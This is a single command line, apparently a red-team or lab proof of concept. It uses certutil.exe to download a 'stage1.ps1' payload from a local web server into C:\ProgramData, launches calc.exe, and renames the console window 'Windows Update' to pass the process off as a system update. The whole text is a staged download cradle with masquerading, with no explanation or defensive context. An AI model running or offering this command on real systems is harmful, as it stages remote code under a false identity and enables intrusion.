
certutil.exe -urlcache -split -f "http://localhost:8080/stage1.ps1" 'C:\ProgramData\stage1.bin'; Start-Process -FilePath "calc.exe"; $Host.UI.RawUI.WindowTitle = "Windows Update"
